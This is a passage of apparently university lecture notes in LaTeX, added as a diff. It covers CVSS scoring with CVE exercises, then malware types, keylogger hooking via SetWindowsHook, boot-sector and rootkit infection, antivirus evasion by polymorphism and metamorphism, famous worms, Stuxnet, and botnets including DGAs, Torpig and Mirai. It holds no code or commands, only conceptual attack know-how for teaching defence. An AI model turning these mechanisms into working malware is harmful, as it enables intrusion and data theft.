+\begin{itemize}
+	\item The attacker must conduct target-specific reconnaissance. For example, on target configuration settings, sequence numbers, shared secrets, etc.
+	\item The attacker must prepare the target environment to improve exploit reliability. For example, repeated exploitation to win a race condition, or overcoming advanced exploit mitigation techniques.
+	\item The attacker injects herself into the logical network path between the target and the resource requested by the victim in order to read and/or modify network communications (e.g. man in the middle attack).
+\end{itemize}
+
+\subsubsection*{Exploitability Metrics: Privileges Required}
+This metric describes the level of privileges an attacker must possess before successfully exploiting the vulnerability. Possible values:
+\begin{enumerate}
+	\item High: The attacker is authorized with (i.e. requires) privileges that provide significant (e.g. administrative) control over the vulnerable component that could affect component-wide settings and files.
+	\item Low: The attacker is authorized with (i.e. requires) privileges that provide basic user capabilities that could normally affect only settings and files owned by a user. Alternatively, an attacker with Low privileges may have the ability to cause an impact only to non-sensitive resources.
+	\item None: The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.
+\end{enumerate}
+
+\subsubsection*{Exploitability Metrics: User Interaction}
+This metric captures the requirement for a user, other than the attacker, to participate in the successful compromise the vulnerable component. This metric determines whether the vulnerability can be exploited solely at the will of the attacker, or whether a separate user (or user-initiated process) must participate in some manner. Possible values:
+\begin{enumerate}
+	\item Required: Successful exploitation of this vulnerability requires a user to take some action before the vulnerability can be exploited. For example, a successful 	exploit may only be possible during the installation of an application by a system administrator.
+	\item None: The vulnerable system can be exploited without any interaction from any user.	
+\end{enumerate}
+
+\subsubsection*{Scope}
+Scope refers to the collection of privileges defined by a security authority (e.g. an application, an operating system, or a sandbox environment) when granting access to computing resources (e.g. files, CPU, memory, etc). These privileges are assigned based on some method of identification and authorization. When the vulnerability of a software component governed by one security authority is able to affect resources governed by another security authority, a \textbf{Scope change} has occurred.
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec38f.png}
+\end{center}
+Possible values:
+\begin{itemize}
+	\item Unchanged: An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.
+	\item Changed: An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.
+\end{itemize}
+ 
+\subsubsection*{Impact metrics}
+Measures the losses on
+\begin{itemize}
+ 	\item Confidentiality = impact on confidentiality of data (property that information is not made available or disclosed to unauthorized individuals, entities, or processes);
+ 	\item Integrity = impact on integrity of data (the “property of accuracy” of information)
+ 	\item Availability = impact on availability of the component (is the “property of being accessible and usable upon demand by an unauthorized entity”?)
+\end{itemize}
+Each metric measures the losses suffered by the impacted component. Possible values:
+\begin{enumerate}
+	\item High: total loss
+	\item Low: partial loss
+	\item None: no loss
+\end{enumerate}
+
+\subsubsection*{Scoring Guide/Philosophy}
+%Access Vector à is the attack bound to the network stack?
+%Attack Complexity à can the attacker control all factors relevant to the exploitation?
+%Privileges Required à does the attacker need be authenticated?
+%User Interaction à does the victim user need to interact with the attack?
+%Scope à is the authorisation authority under which the vulnerable component is the same as the impacted component?
+%Impact
+%– Confidentiality, Integrity à Data
+%– Availability à Service
+When more than one assessment is possible, go with the more severe one (e.g. exploitation can happen both though local I/O and on network stack, in that case go with network).
+
+\subsubsection*{Scoring Exercise}
+MS Word Denial-of-Service attack (CVE-2013-6801): Microsoft Word 2003 SP2 and SP3 on Windows XP SP3 allows remote attackers to cause a denial of service (CPU consumption) via a malformed .doc file containing an embedded image, as demonstrated by word2003forkbomb.doc, related to a "fork bomb" issue.
+\begin{small}
+	\begin{center}
+		\begin{tabular}{|c|c|}\hline
+			Access Vector & \textbf{Local} (trigger of vulnerability by launching the file)\\\hline
+			Access Complexity & \textbf{Low} (SPs probably installed by most users)\\\hline
+			Privileges Required & \textbf{None}\\\hline
+			User Interaction & \textbf{Required}\\\hline
+			Scope & \textbf{Unchanged} (no other authentications required)\\\hline
+			Confidentiality & \textbf{None}\\\hline
+			Integrity & \textbf{None}\\\hline
+			Availability & \textbf{High}\\\hline
+		\end{tabular}
+	\end{center}
+\end{small}
+CISCO host crash (CVE-2011-0355): Cisco Nexus 1000V Virtual Ethernet Module (VEM) 4.0(4) SV1(1) through SV1(3b), as used in VMware ESX 4.0 and 4.1 and ESXi 4.0 and 4.1, does not properly handle dropped packets, which allows guest OS users to cause a denial of service (ESX or ESXi host OS crash) by sending an 802.1Q tagged packet over an access vEthernet port, aka Cisco Bug ID CSCtj17451.
+\begin{small}
+	\begin{center}
+		\begin{tabular}{|c|c|}\hline
+			Access Vector & \textbf{Adiacent} (virtual ethernet network)\\\hline
+			Access Complexity & \textbf{Low} (virtual module)\\\hline
+			Privileges Required & \textbf{None}\\\hline
+			User Interaction & \textbf{None}\\\hline
+			Scope & \textbf{Changed}(vulnerable component, the module, allows DoS by guest users)\\\hline
+			Confidentiality & \textbf{None}\\\hline
+			Integrity & \textbf{None}\\\hline
+			Availability & \textbf{High}\\\hline
+		\end{tabular}
+	\end{center}
+\end{small}
+CVE-2009-0927: Stack-based buffer overflow in Adobe Reader and Adobe Acrobat 9 before 9.1, 8 before 8.1.3 , and 7 before 7.1.1 allows remote attackers to execute arbitrary code via a crafted argument to the getIcon method of a Collab object, a different vulnerability than CVE-2009-0658.
+\begin{small}
+	\begin{center}
+		\begin{tabular}{|c|c|}\hline
+			Access Vector & \\\hline
+			Access Complexity & \\\hline
+			Privileges Required & \\\hline
+			User Interaction & \\\hline
+			Scope & \\\hline
+			Confidentiality & \\\hline
+			Integrity & \\\hline
+			Availability & \\ \hline
+		\end{tabular}
+	\end{center}
+\end{small}
+Libvirt USB handling (CVE-2012-2693): libvirt, possibly before 0.9.12, does not properly assign USB devices to virtual machines when multiple devices have the same vendor and product ID, which might cause the wrong device to be associated with a guest and might allow local users to access unintended USB devices.
+\begin{small}
+	\begin{center}
+		\begin{tabular}{|c|c|}\hline
+			Access Vector & \\\hline
+			Access Complexity & \\\hline
+			Privileges Required & \\\hline
+			User Interaction & \\\hline
+			Scope & \\\hline
+			Confidentiality & \\\hline
+			Integrity & \\\hline
+			Availability & \\ \hline
+		\end{tabular}
+	\end{center}
+\end{small}
+
+\newpage
+\section{Malware}
+Malwares (or \textbf{malicious software}) are programs acting without the conscious or designed authorization of a user or system that may exploit system vulnerabilities. These programs need a host program to operate, they can't execute per se (e.g. viruses, logic bombs, and backdoors), can be independent self-contained programs (e.g. worms, bots) and can replicate or not. Malwares are a sophisticated threat to computer systems.
+
+\subsubsection*{Taxonomy}
+\begin{itemize}
+	\item Virus = attaches, replicates and eventually hits;
+	\item Worm = self-replicates;
+	\item Trojan horse = allows taking control of a machine performing an action that looks legit;
+	\item Keyloggers = sends typed info to attacker;
+	\item Ransomware = attack data availability, asking for a ransom (a sum of money) to unlock the data;
+	\item Rootkit = hook to libraries or system files;
+	\item Bot-net = remote coordinated control of multiple machines.
+\end{itemize}
+Malware can assume characteristics of more than one type.
+
+\subsection{Keylogger}
+They are the most overlooked type of malware, because they are very effective and difficult to be detected. Modern OSs let users access directly the HW using the APIs, leaving open the door for a keylogger, who does not need to run in Kernel space (so with root privilege) but can attack remotely. A keylogger records the data inputted using a keyboard: in old OSs keys were sent directly to the foreground process, now they are published on a bus, where the process reads on, non-exclusively. This was introduced to enable the operation of shortcut managers, which need to be always listening to the user input.
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec39.png}
+\end{center}
+The SetWindowsHook API has as parameters where to attach the hooking procedure (in this case the keyboard, could also be the mouse), the pointer to the hooking procedure function (f), the location of the function (NULL means that it is in the same program) and the thread associated to the keyboard (which can use it): in this last parameter, if the value is set to 0 it extends to all the threads, opening for the attack.
+
+%TODO social engineering (18.03)
+ 
+
+\subsection{Viruses}
+A virus is software that replicate and install itself without user consent. Copies can be installed into programs (modifying them to include a copy of the virus, so it executes secretly when host program is run), data files or boot sectors.
+The components of a virus include:
+\begin{itemize}
+	\item infection mechanism - enables replication
+	\item trigger - event that makes payload activate
+	\item payload - what it does, malicious or benign
+\end{itemize}
+The virus can be prepended (beginning), postpended (end) or embedded into an infected program, which, when is invoked, executes the virus code. Virus payload may change size of executable, embedded layout may avoid this (system dependent): e.g. portable executables headers often have “empty” allocated memory words. \medskip\\
+There are different types of viruses, categorized by infection target (boot sector, file infector, macro virus) or by concealment mechanism (encrypted virus, polymorphic virus, metamorphic virus). In the 80s the target of the virus were mainly executables, with the limitation that different virus needed to be developed for different OSs; then in the 90s became very common a new type of viruses that were platform independent, which instead of executables infected documents so they could easily spread. That was combined with the exploitability of macros in the office apps, where executable programs were embedded in the office documents (so whatever is the OS), not protected at that time; now they are recognized by many anti-virus programs so they evolved to email viruses, which exploit an auto-execution bug in email clients to infect the system.
+
+\subsubsection{I Love You (2000)}
+The user believes that the attachment is a txt file, but it’s actually a VBS (Visual Basic Script): opening the attachment loads and executes the script. The impact caused by it is the disrupt of system files, and it also replicates by sending itself to the full contact list.
+Not relying on office but it still relies on an “interpreter” to execute, it is not native code.
+
+\subsubsection*{Boot sector infections}
+What happens during the boot (old scheme, now it starts with UEFI)?
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec39b.png}
+\end{center}
+At boot time, the firmware checks for system components and tests them. The operating system is then copied from the hard drive to the RAM. The Master Boot Record (MBR) contains code that ultimately leads to loading OS in memory. The MBR, typically small in size, points to boot loader (in Volume Boot Record, VBR), forming a "chain loading” system. The boot loader actually loads the OS. The goal of the virus is to include itself in this chain, before the kernel so it can hide effectively.
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec39c.png}
+\end{center}
+In the second image is depicted an example in a windows version where it was possible to rewrite the MBR from the user space: the virus, placed in the MBR, was able to insert himself in the boot sequence, and the bootstrap loader was moved in a different location in the memory, executing the system initialization as usual: in this way it was undetectable. \medskip\\
+Now UEFI and secure boot avoid these exploitations, with the Trusted Platform Module (TPM), that checks the integrity of all steps of the boot.
+
+\subsection*{Rootkits}
+Rootkits can take control of the MBR,  injecting into the kernel to defeat disk encryption (Stone Bootkit). They are a set of programs installed for admin access, subverting report mechanisms on processes, files, registry entries, etc. They may be:
+\begin{itemize}
+	\item persistent or memory-based;
+	\item kernel mode (hard to detect and remove);
+	\item installed by user via trojan or intruder on system.
+\end{itemize}
+
+\subsection*{Virus countermeasures}
+Prevention is an ideal solution but difficult. It realistically need: detection, identification and removal. If detect but impossible to identify or remove, the whole infected program must be discarded and replaced.
+
+\subsubsection*{AV defenses}
+Virus and antivirus tech have both evolved: early viruses were just simple code, which were easily removed, and as they have become more complex, so have the countermeasures. There are 4 generations of AV technologies:
+\begin{enumerate}
+	\item \textbf{signature scanners}: look for known traces of virus in memory;
+	\item \textbf{heuristics}: look for features common in malware 	traces/strands;
+	\item \textbf{identify actions}: behavioral fingerprint of the malware execution;
+	\item \textbf{machine learning}: classifiers trained to decide whether a file or program is acting maliciously.
+\end{enumerate}
+
+\subsubsection*{Defense 1 - Signature scanners}
+Malware is analysed by a security firm, searching for a footprint of malware in memory. Every time malware is loaded into memory, a pre-fixed series of bits will appear in disk: this footprint is the “signature” of the malware. Recognition happens through matching those sequence of bytes with all signatures known to a security product. It is a purely “reactive” strategy, unknown malware does not yet have a signature. Detection can only happen after analysis.
+
+\subsubsection*{Defense 1 - Heuristics}
+Partially addresses the polymorphism problem. Viruses may evolve to different strains of the same virus family: manual modifications, new malware versions or genetic algorithms.
+Different footprint but common characteristics so rather than having an exact match of the footprint in memory, detection happens by partial matching, searching for common characteristics of a virus strain.
+
+\subsubsection*{Evolution 1 - Polymorphic viruses}
+Polymorphic is the first technique that posed a serious threat to Antiviruses. It uses encryption to obfuscate code, and the decryption module is modified at each infection so that all samples will have a different footprint in memory (fixed encryption per se would not be enough). 
+A well-written polymorphic virus has no parts which remain identical between infections, so signature checking is useless and heuristics may work only if encryption-decryption pair does not vary enough.
+
+\subsubsection*{Defense 2 - Generic Decryption}
+Each polymorphic virus will look different on disk, but at execution time code will always be the same. If detection happens when malware is executed, it’s too late. Generic Decryption is basically Sandboxing: a potential virus is executed on an emulated environment, which has no actual access to system resources. The malware decrypts itself so signature checking will now work. Modern malware can prevent execution in emulated or virtual environment via analysis of the execution environment, and prevent analysis by researchers.
+
+\subsubsection*{Evolution 2 - Metamorphic viruses}
+Metamorphic means that to avoid being detected by emulation, some viruses can rewrite themselves completely each time they are to infect new executables (differently from polymorphic also the logic changes). After execution on emulated environment, the signature won’t match. A metamorphic engine is needed to enable virus, which has to be very large and complex (e.g., Win32/Simile virus consisted of over 14,000 lines of assembly code).
+
+\subsubsection*{Defense 3 – Behavioural detection}
+Addresses issue with metamorphic malware and detection of previously unseen malware. It is based on a set of actions that the malware performs. The basic idea is that a malware behaves differently from legitimate software: system calls, interaction with drivers (e.g. I/O), system interrupts, etc. 
+It is very hard to enumerate all possible actions (exponential time) and so be precise, so the analysis is restricted to closed patterns. It is also hard to correctly identify set of actions that characterise malware: the risk of false positives is higher than for heuristics and signatures (you need an hash collision for that).
+
+\subsubsection*{Defense 4 – Using on ML}
+It is the natural extension of the previous approach. Machine learning is used to model the malware detection problem as a classification problem. Bayesian networks were the first of being employed with satisfactory results, neural networks are more popular nowadays. It is still hard to correctly identify set of features that characterise malware, so the risk of false positives remains. Another problem is the employment of Adversarial AI from the attacker point of view, which can study a malware that does not get classified as such.
+
+\subsubsection*{Defenses in practice}
+ Defense is only effective when it prevents malware execution, once the system is infected, system can not be trusted anymore. Malware removal can not be trusted because malware can affect the integrity of system procedures too, intercept antivirus’ calls to OS disk drivers to analyse stored malware (returns “null” or benign file) or disable antivirus itself (e.g. Conficker).
+ Run analysis from a clean drive on uninitialized infected OS.
+ 
+ 
+ \subsection{Worms}
+Worms are replicating program that propagates over net using email, remote exec, remote login. They exploit the remote payloads, typically using arbitrary code execution that causes buffer overflows.
+A worm has phases like a virus: dormant, propagation, triggering, execution. During the propagation phase, it searches for other systems, connects to one, copies self to it and runs; then it repeats this. It may disguise itself as a system process. It was implemented by Xerox Parc in Palo Alto in the 1980s.\medskip\\
+The propagation model is a logistic model in finite systems. It starts off exponentially, then levels out (mainly because it becomes more difficult to find other machines not already infected).
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec39d.png}
+\end{center}
+
+\subsubsection{Morris worm}
+Created in 1988 by Robert Morris, convicted under Computer Fraud and Abuse Act (3 years on probation, now CS professor at MIT). 
+It exploited different vulnerabilities:
+\begin{itemize}
+	\item Sendmail = could execute command via SMTP;
+	\item Finger = BoF;
+	\item weak passwords = dictionary attack.
+\end{itemize}
+There was no malicious payload, but propagation was too fast for the infrastructure to hold: a single computer could be infected multiple times, similarly to a “fork bomb” issue (malware needs testing too). It caused several million dollars in damage.
+
+\subsubsection*{Historical internet worms}
+\begin{itemize}
+	\item Morris worm (1988): overflow in fingerd, 6,000 machines infected (10\% of existing Internet);
+	\item CodeRed (2001): overflow in MS-IIS server, 300,000 machines infected in 14 hours;
+	\item SQL Slammer (2003): overflow in MS-SQL server, 75,000 machines infected in 10 minutes;
+	\item Sasser (2004): overflow in Windows LSASS, around 500,000 machines infected.
+\end{itemize}
+
+\subsubsection{The Welchia and Blaster worms}
+\begin{itemize}
+	\item Blaster: appeared in august 2003, affecting primarily Windows XP machines. It caused SYN D-DoS against \textit{windowsupdate.com}.
+	The vulnerability exploited a BoF in RPC (patch existed since May 2003). As a side effect it made RPC unstable and XP unusable.
+	\item Welchia (anti-worm): removed the Blaster infection, patching the vulnerability. It used the same Microsoft RPC bug as Blaster and deleted itself after January 1, 2004. It turned out to be a bad approach to patch the victims because failures of it stopped some services (unwanted patching without any validation).
+\end{itemize}
+
+\subsubsection{Slammer (Sapphire)}
+BoF in Microsoft’s SQL server, patch released 6 months earlier. A single UDP packet sent to port 1434 infects the machine (binary fits in the packet). The worm overwrote RET to point to malware in buffer, then generated random generation of IP addresses to send copy of itself. It worked because IP space is populated, mostly by MS systems: the attacker did not care about false postives. 30k copies/second were sent via UDP, with an exponential growth, so fast it saturated the bandwidth of the whole internet in 10 minutes, in combination with routers failing and subsequent generation of route table updates traffic. 75k SQL servers were infected.
+\begin{center}
+	\includegraphics[scale=0.4]{img/netsec39e.png}
+\end{center}
+It killed several critical points of internet infrastructure (5 DNS root servers, all of South Korea’s cell phone network, Bank of America ATMs): those were the one really afflicted by it since there was no malicious payload executed on infected systems. The infection followed a logistic model in finite systems, starting off exponentially, then levelling out also becuase of the same network failure it caused (no bandwidth available).
+
+\subsubsection*{More recent malware}
+At first the use of malware was not a profitable activity: the attacks developed were mostly a type of "vandalism" also because the investment to create them was not important. Things have changed completely in the last years. Cyber crime has become an activity regulated by the rules of economy: there are investments in the production of malware aimed to gain money. This is reflected in the types of malware: the techniques seen in the previous malwares are still used but have been developed and are now much more sophisticated. Recent malware are \textbf{target attacks}, against generalized attacks typical of the previous decades.
+The targets are progressively more and more small business (from 18\% in 2011 to 43\% in 2015). The type of attacks seen later on is called Advanced Persistent Threat (ATP):
+\begin{itemize}
+	\item Advanced: these attacks are move advanced because they mostly exploit not already known vulnerabilities (patching is now more efficient) but Zero-day vulnerabilities (not known yet);
+	\item Persisent: while the previous malwares left the machine after doing the damage, these tend to remain hidden in the machine logging informations for months or even years, to get as much as possible. 
+\end{itemize}
+Most of APTs are also multi-threat and multi-stage: they are a bundle of exploits that include all the previously seen malwares and attack over different stages, like a chain.
+\begin{center}
+	\includegraphics[scale=0.45]{img/netsec40.png}
+\end{center}
+These phases do not have to be performed all in this order, for example the first 3 of them may be repeated after the attacker gets into the system, so that it is possible to perform reconnaissance from inside the system and find other vulnerabilities to be exploited. \\
+In the end it may be possible to execute a chained exploit:
+\begin{center}
+	\includegraphics[scale=0.35]{img/netsec40b.png}
+\end{center}
+
+\subsubsection{Stuxnet}
+Probably the prototype of sophisticated malware. It was a complex attack targeting not information systems but a cyberphisical system, a nuclear plant. An attack on a phisical system is a threat not only to security but also to safety, as it could be one on the recent IoT systems. It is divided in 3 phases: phase 1 attacks the pure network information system (IT), phase 2 and 3 target the industrial control (OT).
+\begin{itemize}
+	\item \textbf{PHASE 1}: an almost normal worm, amazingly smart, spreads, hides, updates itself (C\&C, command and control, communication) and looks around to duplicate itself (only in an environment with equipment that makes possible to enter phase 2).
+	\item \textbf{PHASE 2}: attacking the Siemens + PLC (Programming Logic Controller) systems. It infects the SIEMENS System and it modifies the PLC programming.
+	\item \textbf{PHASE 3}: sabotage. It checks for a specific factory environment (Iran): if it does not find it, it does nothing, but if it finds it, it changes the speed of the centrifuges.
+\end{itemize}
+
+\subsubsection*{Phase 1: the Window system}
+\begin{minipage}{0.35\textwidth}
+	\begin{center}
+		\includegraphics[scale=0.4]{img/netsec40c.png}
+	\end{center}
+\end{minipage}
+\hfill
+\begin{minipage}{0.6\textwidth}
+A very elaborate standard worm was spread inside the LAN using a compromised USB stick, which infected other USB sticks and exploited Print Spooler, Shared Folders, etc.
+4 zero-days vulnerabilities were used:
+\begin{itemize}
+	\item \textbf{LNK} (MS10-046): windows shell vulnerability to execute remotely code;
+	\item \textbf{Print Spooler} (MS10-061): execute remotely code;
+	\item \textbf{Server Service} (MS08-067): execute remotely code;
+	\item \textbf{Privilege escalation}: obtain privileges.
+\end{itemize}
+It looked for Siemens Step 7 project folders, installed a rootkit that made it invisible and checked which antivirus was active then chose the target executable accordingly.
+\end{minipage}
+
+\subsubsection*{Phase 2: targeted attack}
+Looked for systems running WinCC and PCS 7 SCADA MANAGEMENT PROGRAMS, finding them even if disconnected (via USB sticks). It attacked them, exploiting:
+\begin{itemize}
+	\item Hard-wired password (WinCC);
+	\item Uploads as stored procedure;
+	\item Siemens Project 7 folder vulnerabilities.
+\end{itemize}
+It hooked into specific Step 7 dll to communicate with the PLC, replacing the PLC Code and hiding using Rootkit techniques. It was the first PLC rootkit EVER.
+
+\subsubsection*{Phase 3: the damage}
+Hit frequency converters controlling speed of motors, making them go faster than planned to burn the centrigue. It was designed to hit a specific plant.
+
+\subsection{Botnets}
+Virtual Network of infected machines under the control of a “bot herder”. These machines can perform any kind of action for the bot herder and are managed through a C\&C server under the control of an attacker, which pushes configuration files and functionality updates. Bots must be able to communicate with the C\&C server in order to do something. There are 2 types of design of botnets: centralised and peer-to-peer. \medskip\\
+Main usage of botnets:
+\begin{itemize}
+	\item Performing distributed denial of service attacks (DDoS): same techniques as normal DoS attacks, but amplified by a factor equal to size of botnet;
+	\item Spam: used to distribute spam emails, which can lead to further infections or subscription to services/goods;
+	\item Computational power: use CPU/GPU time to find hash collisions, break ciphers, mine bitcoins;
+	\item Steal sensitive information from the infected machine;
+	\item Rental: bot herder can rent part of the bots to other 	criminals, to outsource computations, buy credit card numbers (CCNs), etc.
+\end{itemize}
+
+\subsubsection*{Botnets – centralised architecture}
+\begin{center}
+	\includegraphics[scale=0.4]{img/netsec41.png}
+\end{center}
+Bots communicate with the bot herder via
+\begin{itemize}
+	\item IRC (Internet relay chat) server: first definition of “bot”, served “human users” by providing automatised services. Essentially a program accepting commands in inputs and retrieving answers;
+	\item HTTP: Connects to a remote HTTP server. A bot may contact the herder fixed (set of) IP(s) or resolve the domain dynamically. Fast-flux vs domain-flux (explained later).
+\end{itemize}
+C\&C server is a single-point-of-failure: who controls the C\&C controls the botnet.
+
+\subsubsection*{Botnet – p2p architecture}
+\begin{center}
+	\includegraphics[scale=0.4]{img/netsec41b.png}
+\end{center}
+More robust than centralised architecture. Commands are spread through the network and bots can act as both slaves and masters dynamically. When a new machine is infected, the bot joins the network with different approaches:
+\begin{itemize}
+	\item Hard-coded list of peers are contacted upon infection, updates its neighboring peer list;
+	\item Mixed p2p/centralised approach, centralised web cache with list of peers;
+	\item Infected bot inherits peer list from infector.
+\end{itemize}
+
+\subsubsection*{Three types of p2p botnets [Silva 2012]}
+\begin{itemize}
+	\item \textbf{Parasite}: all bots are selected from vulnerable hosts within an existing P2P network. Number of vulnerable hosts in the existing P2P network limits the scale of a parasite botnet. It is not flexible and greatly reduces the number of potential bots under the botmaster’s control.
+	\item \textbf{Leeching}: members join an existing P2P network and depend on this P2P network for C\&C communication. Bot candidates may be vulnerable hosts that were either inside or outside an existing P2P network.
+	\item Bot-only: builds its own network in which all members are bots.
+\end{itemize}
+
+\subsubsection*{Centralised botnets - details}
+Bots can not operate if they can not contact the C\&C server. Centralised Botnet take downs happen by "sinkholing". Security researcher/firm takes control of C\&C, and the C\&C server needs to be protected:
+\begin{itemize}
+	\item Change IP address frequently = \textbf{fast-flux}. Makes it hard for an attacker to take it down. One domain is mapped to several IP addresses.
+	\item Change domain frequently = \textbf{domain-flux}. Each bot generates “valid domain names” periodically and resolves them.
+\end{itemize}
+
+\subsubsection*{Domain flux}
+Each bot uses a \textbf{Domain Generation Algorithm} (\textbf{DGA}) to generate a list of possible domains at a certain time (“rendezvous” domains). The list is generated independently by each bot. If bot gets no answer from a generated domain, it simply switches over to the next in the list.
+Conficker A (a very famous botnet), for example was using \textit{txkjngucnth.org} (\url{https://msrc-blog.microsoft.com/2009/02/12/conficker-domain-
+	information/}). 
+Sometimes botnets perform accidental DoS attacks against “colliding” domain names: DGA generates a domain that already exists and all bots try to contact that domain (it happened, e.g., jogli.com, praat.org).
+
+\subsubsection{Torpig [Stone-Gross 2009] (case study putting all together)}
+Torpig was a botnet active in 2009. It used Mebroot as a rootkit, which substitutes the Master Boot Record of the machine (used to perform actions at boot time). It is harder to detect malware, executed in the context of \textit{explorer.exe}, operates directly on disk blocks (through disk drivers) and, upon reboot, downloads and activates malware. Torpig in this case encrypted the communcation with Mebroot server (the malware was stored locally, encrypted, so it was difficult to identify its behaviour). Mebroot provides functionalities to embed (malicious) modules to normal system boot. \medskip\\
+The functionalities of Torpig were credential stealing, generation of phishing attacks for a set of pre-defined websites and injecting phishing content to webpages presented to user (typically a login page). 
+
+\subsubsection*{Sinkholing Torpig}
+A team at University of California reverse engineered the DGA: they noticed that a set of domains that would be generated between 25th Jan and 15th Feb were not registered yet, so they registered the domains and replicated a “fake” C\&C server. All it needed to do was to confirm itself as a valid server: Torpig uses HTTPS but accepts any certificate as valid. They started passively listening to whatever the bots were sending. On the 4th Feb the bot herder realised what was going on and a Mebroot update was pushed for Torpig, after only 10 days.
+
+\subsubsection*{Torpig size}
+IPs changed very frequently (fast-flux) so the counting of unique IPs is not a good proxy for botnet size. Each bot has unique id +  additional features. About 180.000 hosts (1.2M IP addresses).
+
+\subsubsection*{Torpig collected data}
+Torpig collected mailbox accounts, emails, form data, HTTP account, FTP account, POP account, SMTP account and Windows passwords.
+
+\subsubsection{Mirai botnet}
+They are botnet targeting IoT devices (cameras, DVR, routers, etc.). There is an high number of variants, some still active. It was first discovered Aug 2016. The source code has been published, resulting in a lot of people implementing it. Mirai was used to mount huge DDoS against several websites.
+\begin{center}
+	\includegraphics[scale=0.4]{img/netsec42.png}
+\end{center}
+With Mirai it is possible to compromise IoT, like cameras, by trying bruteforce on Telnet, service still allowed by many devices that enables to login and execute remote commands; Telnet does not implement an encrypted channel and it is protected by password, which is usually really weak. The malware tries a list of passwords and it has been very succesful, obtaining control of devices which report their IPs to a server. The C\&C server can use these devices to mount a DDoS attack.  \medskip\\
+An example of DDoS: after revealing the identity of two guys behind a DDoS service, the site Krebs on Security was subject to the most massive DDoS attack ever witnessed to that moment. Clocked at a staggering 620 gigabit per second, it was carried out by botnets consisting mainly of IoT devices, mostly security cameras and DVRs used in home or office settings.
+\begin{center}
+	\includegraphics[scale=0.4]{img/netsec42b.png}
+\end{center}
+After the release of the source code, variants appeared using other protocols (like HTTP).
+
+
+%TODO riassunto nel video del 31/03
+
+\newpage
+\section{Web based attacks}
+The increase of economic value in the use of internet (like in online banking) shifted the focus of cyber-crime towards it, too.
+
+\subsubsection*{National States role}
+Each National State plays now a role in security since cyberspace has become a new defense dimension (Land, Sea, Air and \textit{Information}). 
+\begin{quote}
+	"a global domain within the information environment consisting of the interdependent network of information technology infrastructures and resident data, including the Internet, telecommunications networks, computer systems, and embedded processors and controllers"
+	\begin{flushright}
+		US DoD (Department of Defense) definition
+	\end{flushright}
+\end{quote}
+
+\subsection{Malware propagation}
+Internet Worms (=self-propagating malware) spread at very high speed and their payload could deliver any type of functionality to the attacker: faster propagation speed means a higher number of infected targets, higher number of infections means more bank accounts (not necessarly) and more bank accounts means higher ROI for the attacker. \\
+Malware author operates in a competitive and adversarial environment:
+\begin{itemize}
+	\item \textbf{Adversaries} are security researchers that reverse engineer their malware and security firms that build AV signatures for malware detection;
+	\item \textbf{Competitors} are the many players in the malware development market. The market of infections has finite amount of resources and finite number of vulnerable systems (each system worth x \$). Malware authors compete to access victim’s valuable information.
+\end{itemize}
+
+\subsubsection*{Propagation vs operation}
+Strategy 1: High propagation rate
+\begin{itemize}
+	\item PRO: several infections per unit of time
+	\item CONS: the more samples of malware in the wild, the higher the
+	chances to hand a sample to security researchers (more infections means faster detection)
+\end{itemize}
+Strategy 2: Low propagation rate
+\begin{itemize}
+	\item PRO: higher stealthiness and fewer chances of infecting a system already infected by another malware
+	\item CONS: fewer infections per unit of time
+\end{itemize}
+These conditions hold for all attackers. In the economic theory there is an ”equilibrium point” whereby all competing players maximize their expectations in terms of return to investment.
+
+\subsubsection*{Infection strategy example (intuition)}
+There are $K>1$ attackers that compete to infect $N>>1$ systems, collectively worth $M$. The average is $M/N$. Assume that all N systems have an antivirus: the survival time of malware $K$ ($L_k$) is inversely proportional to the number $N_K$ of systems infected by $K$ (say $L_k$ = $1/N_K$).
+\begin{itemize}
+	\item Strategy 1 = all attackers infect all systems. The average return for each attacker is $M/K$; $L_k$ is $1/N_k =1/N$ = lowest possible.
+	\item Strategy 2 = all attackers infect $N/K$ systems.The return for each attacker is $N/K*M/N=M/K$ which is the same as before; $L_k$ is $1/N_k = 1/(N/K) > 1/N$: the mean lifetime of the $K^{th}$ malware with S2 is higher than with S1. It is true for all values of $K$.
+\end{itemize}
+
+\subsubsection*{Self-replication vs controlled deployment}
+It is very hard to predict outcomes of fully-automated propagation mechanism (e.g. Morris worm was programmed to “contain” its propagation, replicating 1 time out of 7, but spread uncontrollably). That is way modern (post 2010) internet malware does not employ self-propagation mechanisms. Rather, malware distribution operates over standard request-reply network mechanisms (like botnets), since they have long lifetimes. They are usually distributed over the so-called Malware distribution networks, that control infections using different methods (it is like a market):
+\begin{itemize}
+	\item Automated malware installs via software exploits (typically through the browser/third party plugins);
+	\item Malware services that install malware (Mebroot);
+	\item Pay-per-infection (do not care about methods).
+\end{itemize}
+There is an emergence of these markets for infection.
+
+\subsubsection*{Malware Distribution networks}
+They enforce web attacks via several mechanisms. Servers on the web that “deliver” the malware to the final user may exploit compromised websites, content networks (e.g. advertisement) or redirects.
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec43.png}
+\end{center}
+
+\subsection{Malware delivery – mechanisms review}
+Malware infections happen through one or a combination of different channels:
+\begin{itemize}
+	\item \textbf{Service infection}: buffer overflow of a vulnerable service listening on the network (RPC, Web servers, SQL servers, ...). Nowadays services are more difficult to reach: NAT and firewalls are implemented and incoming connections are controlled so that only services supposed to be listening on the network are reachable (e.g. SSH from internal network only, HTTP from everybody, so a SSH vulnerability can not be reached from outside).
+	\item \textbf{Client infection}: buffer overflow against user’s client (e.g. Browser, plugins), redirects of user’s browser to compromised websites, social engineering (convince user in performing an action with mail or phishing websites) and others like password guessing, infected devices.
+\end{itemize}
+
+\subsubsection*{Client infections}
+Browser-related content requests are by far the most common on the web. Client infections are typically driven by browser or other client activity (mail clients, chat clients, etc).
+There is a limited set of configurations, so a less uncertainty on vulnerability distribution: 4 browsers share the biggest fraction of users, with similar plugin configurations: Flash, Javascript, Adobe, Silverlight.
+
+\subsubsection*{Webpage contents and operations}
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec43b.png}
+\end{center}
